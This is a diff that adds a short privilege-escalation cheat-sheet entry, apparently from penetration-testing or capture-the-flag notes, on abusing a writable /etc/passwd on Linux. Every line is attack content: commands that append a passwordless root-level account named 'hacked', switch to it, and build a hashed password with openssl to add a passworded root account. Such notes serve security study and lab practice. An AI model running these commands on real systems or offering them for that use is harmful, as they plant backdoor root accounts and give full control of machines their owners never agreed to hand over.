@@ -1,0 +1,12 @@
+WRITABLE /ETC/PASSWD
+bash# Check if writable
+ls -la /etc/passwd
+
+# Add root user
+echo "hacked::0:0:root:/root:/bin/bash" >> /etc/passwd
+su hacked
+
+# With password (openssl gen)
+openssl passwd -1 -salt xyz password123
+echo "hacked:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
+su hacked
